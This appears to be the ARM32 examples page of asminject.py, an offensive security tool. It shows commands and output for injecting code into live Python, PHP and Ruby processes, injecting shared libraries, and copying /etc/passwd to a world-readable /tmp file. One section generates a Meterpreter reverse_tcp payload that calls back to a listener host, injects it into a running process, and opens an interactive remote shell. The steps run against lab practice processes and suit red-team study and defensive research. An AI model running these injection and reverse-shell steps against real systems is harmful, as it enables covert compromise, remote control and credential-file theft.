# asminject.py examples - ARM32 payloads

* [Injecting Python code into a Python 3 process](#injecting-python-code-into-a-python-3-process)
* [Injecting Python code into a Python 2 process](#injecting-python-code-into-a-python-2-process)
* [Injecting PHP code into a PHP process](#injecting-php-code-into-a-php-process)
* [Injecting Ruby code into a Ruby process](#injecting-ruby-code-into-a-ruby-process)
* [Inject Meterpreter into an existing process](#inject-meterpreter-into-an-existing-process)
* [Inject shellcode into a separate thread of an existing process](#inject-shellcode-into-a-separate-thread-of-an-existing-process)
* [Inject a Linux shared library (.so) file into an existing process, like the original dlinject.py](#inject-a-linux-shared-library-so-file-into-an-existing-process-like-the-original-dlinjectpy)
* [Inject a Linux shared library (.so) file into a new thread in an existing process](#inject-a-linux-shared-library-so-file-into-a-new-thread-in-an-existing-process)
* [Create a world-readable copy of a file using only Linux syscalls](#create-a-world-readable-copy-of-a-file-using-only-linux-syscalls)
* [Create a copy of a file using buffered read/write libc calls](#create-a-copy-of-a-file-using-buffered-read/write-libc-calls)

## Injecting Python code into a Python 3 process

Terminal 1:

```
pi@bt-minion1:~/asminject/practice $ python3 ./python_loop.py

2022-05-16T22:16:18.425058 - Loop count 0
2022-05-16T22:16:23.430401 - Loop count 1
```

Terminal 2:

```
# ps auxww | grep python

pi       26611  1.8  0.8  14372  7160 pts/0    S+   15:16   0:00 python3 ./python_loop.py

# python3 ./asminject.py 26611 execute_python_code.s \
   --arch arm32 --relative-offsets-from-binaries \
   --non-pic-binary "/usr/bin/python.*" \
   --stop-method "slow" \
   --var pythoncode "print('injected python code');"

...omitted for brevity...
[*] Handling '/usr/bin/python3.7' as non-PIC binary
...omitted for brevity...
[*] Restoring original memory content
[+] Done!
```

Back in terminal 1:

```
2022-05-16T22:18:08.541095 - Loop count 22
injected python code
2022-05-16T22:18:17.547089 - Loop count 23
```

## Injecting Python code into a Python 2 process

Terminal 1:

```
pi@bt-minion1:~/asminject/practice $ python2 ./python_loop.py

2022-05-16T22:10:56.017464 - Loop count 0
2022-05-16T22:11:01.022812 - Loop count 1
2022-05-16T22:11:06.028053 - Loop count 2
```

Terminal 2:

```
# ps auxww | grep python

pi       24704  1.0  2.4  27720 21040 pts/0    S+   15:10   0:00 python2 ./python_loop.py

# python3 ./asminject.py 24704 execute_python_code.s \
   --arch arm32 --relative-offsets-from-binaries \
   --non-pic-binary "/usr/bin/python.*" --stop-method "slow" \
   --var pythoncode "print('injected python code');"

                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.15
Ben Lincoln, Bishop Fox, 2022-05-16
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject

[*] Handling '/usr/bin/python2.7' as non-PIC binary
...omitted for brevity...
[*] Restoring original memory content
[+] Done!
```

Back in terminal 1:

```
2022-05-16T22:11:26.049014 - Loop count 6
injected python code
2022-05-16T22:11:35.054965 - Loop count 7
```

## Injecting PHP code into a PHP process

Terminal 1:

```
pi@bt-minion1:~/asminject/practice $ php ./php_loop.php

2022-05-16T17:08:03-0700 - Loop count 0
2022-05-16T17:08:08-0700 - Loop count 1
2022-05-16T17:08:13-0700 - Loop count 2
```

Terminal 2:

```
# ps auxww | grep php

pi        4955  0.0  1.6  62616 14068 pts/0    SN+  17:08   0:00 /usr/bin/php ./php_loop.php

# python3 ./asminject.py 4955 execute_php_code.s \
   --arch arm32 --relative-offsets-from-binaries \
   --non-pic-binary "/usr/bin/php.*" --stop-method "slow" \
   --var phpcode "echo \\\"Injected PHP code\\\n\\\";" \
   --var phpname PHP 

[*] Handling '/usr/bin/php7.3' as non-PIC binary
...omitted for brevity...
[+] Done!
```

Back in terminal 1:

```
2022-05-16T17:08:38-0700 - Loop count 7
Injected PHP code
2022-05-16T17:08:47-0700 - Loop count 8
```

## Injecting Ruby code into a Ruby process

Terminal 1:

```
pi@bt-minion1:~/asminject/practice $ ruby ./ruby_loop.rb 
2022-05-16T16:03:20-07:00 - Loop count 0
2022-05-16T16:03:25-07:00 - Loop count 1
```

Terminal 2:

```
# ps auxww | grep ruby

pi       12000  4.8  0.7  22144  6756 pts/0    Sl+  16:03   0:00 ruby ./ruby_loop.rb

# python3 ./asminject.py 12000 execute_ruby_code.s \
   --arch arm32 --relative-offsets-from-binaries \
   --stop-method "slow" \
   --var rubycode "puts(\\\"Injected Ruby code\\\")"

...omitted for brevity...
[+] Done!
```

Back in terminal 1:

```
2022-05-16T16:04:05-07:00 - Loop count 9
Injected Ruby code
```

## Inject Meterpreter into an existing process

Launch a harmless process that simulates one with access to super-secret, sensitive data:

```
$ sudo python3 practice/python_loop.py

2022-05-18T20:29:26.858397 - Loop count 0
2022-05-18T20:29:31.863660 - Loop count 1
2022-05-18T20:29:36.868972 - Loop count 2
```

In a separate terminal, generate a Meterpreter payload, then launch a listener:

```
# msfvenom -p linux/armle/meterpreter/reverse_tcp -f raw \
   -o lmrtarm11443 LHOST=172.19.87.7 LPORT=11443

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: armle from the payload
No encoder specified, outputting raw payload
Payload size: 260 bytes
Saved as: lmrtarm11443

# msfconsole

...omitted for brevity...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/armle/meterpreter/reverse_tcp
payload => linux/armle/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
```

In a third terminal, locate the process and inject the Meterpreter payload into it. Note the use of the `--precompiled` option to specify the `lmrt11443` shellcode.

```
# ps auxww | grep python

pi        5283  0.3  5.1  54224 44908 pts/1    S    13:00   0:06 gdb --args python3 ./python_loop.py
pi        5487  0.0  0.9  23524  8008 pts/1    SNl+ 13:29   0:00 /usr/bin/python3 ./python_loop.py


# python3 ./asminject.py 5487 execute_precompiled.s \
   --arch arm32 --stop-method "slow" \
   --precompiled lmrtarm11443
```

You should see something like the following pop up in the third terminal:

```
[*] Sending stage (908480 bytes) to 172.19.87.11
[*] Meterpreter session 2 opened (172.19.87.7:11443 -> 172.19.87.11:52736 ) at 2022-05-18 13:00:11 -0700
sessions -i 2
[*] Starting interaction with 2...

meterpreter > sysinfo
Computer     : 172.19.87.11
OS           : Debian 10.6 (Linux 5.4.77-v7l-blincoln0002+)
Architecture : armv7l
BuildTuple   : armv5l-linux-musleabi
Meterpreter  : armle/linux
meterpreter > shell
Process 5280 created.
Channel 1 created.
whoami
pi
```

Warnings:

* The code for the original process will not continue executing after the shellcode is launched. See the threaded version below if you need that.
* The original process will exit when Meterpreter exits.

## Inject shellcode into a separate thread of an existing process

The `execute_precompiled_threaded.s` payload is identical to the `execute_precompiled.s` payload described above, except it executes the precompiled binary shellcode in a separate thread. This allows the target process to continue executing normally.

This payload requires relative offsets for `libpthread` shared library used by the target process.

```
# python3 ./asminject.py 5487 execute_precompiled_threaded.s \
   --arch arm32 --relative-offsets-from-binaries \
   --stop-method "slow" \
   --precompiled lmrtarm11443
...omitted for brevity...
```

Warnings:

* The original process will still exit if your shellcode triggers an OS-level process exit. Meterpreter's default configuration does this, and as of this writing, the Linux version of Meterpreter does not have an equivalent of the Windows Meterpreter `EXITFUNC=thread` option, so the only workaround is to not call `exit` in Meterpreter until you want the target process to exit.

## Inject a Linux shared library (.so) file into an existing process, like the original dlinject.py

The `dlinject.s` payload mimics the original `dlinject.py`, except that it does so using the `dlopen` function exported by `libdl` instead of the secret `_dl_open` function that some versions of the `ld` library exported. This works around [dlinject.py's inability to run on more recent Linux versions](https://github.com/DavidBuchanan314/dlinject/issues/8).

This payload requires one variable: `librarypath`, which should point to the library you want to inject.

This payload requires relative offsets for the `libdl` shared library used by the target process.

As of this writing, generating an ARM32 `elf-so` Meterpreter payload doesn't work for me using `msfvenom`, but you can copy/paste some raw meterpreter shellcode into `asm_development/execute_inline_shellcode.c` and compile it into a .so file using the instructions in the source code.

```
# python3 ./asminject.py 5487 dlinject.s \
   --arch arm32 --relative-offsets-from-binaries \
   --stop-method "slow" \
   --var librarypath "/home/pi/asminject/execute_inline_shellcode.so"
```

The injection comes with the same warnings as for `execute_precompiled.s*`, above.

## Inject a Linux shared library (.so) file into a new thread in an existing process

The `dlinject_threaded.s` payload is identical to `dlinject.s`, except that it launches the shellcode in a new thread, so that the original process continues performing its normal behaviour.

This payload requires one variable: `librarypath`, which should point to the library you want to inject.

This payload requires relative offsets for the `libdl` and `libpthread` shared libraries used by the target process.

```
# python3 ./asminject.py 5750 dlinject_threaded.s \
   --arch arm32 --relative-offsets-from-binaries \
   --relative-offsets-from-binaries --stop-method "slow" \
   --var librarypath "/home/pi/asminject/execute_inline_shellcode.so"
```

This injection comes with the same warnings as for `execute_precompiled_threaded.s`, above.

## Create a world-readable copy of a file using only Linux syscalls

Use of this payload is identical to the x86-64 equivalent except for the `--arch arm32` option:

```
python3 ./asminject.py 4397 copy_file_using_syscalls.s \
   --arch arm32 --stop-method "slow" \
   --var sourcefile "/etc/passwd" \
   --var destfile "/tmp/bishopfox.txt"
```

## Create a copy of a file using buffered read/write libc calls

Use of this payload is identical to the x86-64 equivalent except for the `--arch arm32` option:

```
# python3 ./asminject.py 4397 copy_file_using_libc.s \
   --arch arm32 --relative-offsets-from-binaries \
   --stop-method "slow" \
   --var sourcefile "/etc/passwd" \
   --var destfile "/tmp/bishopfox.txt"
```
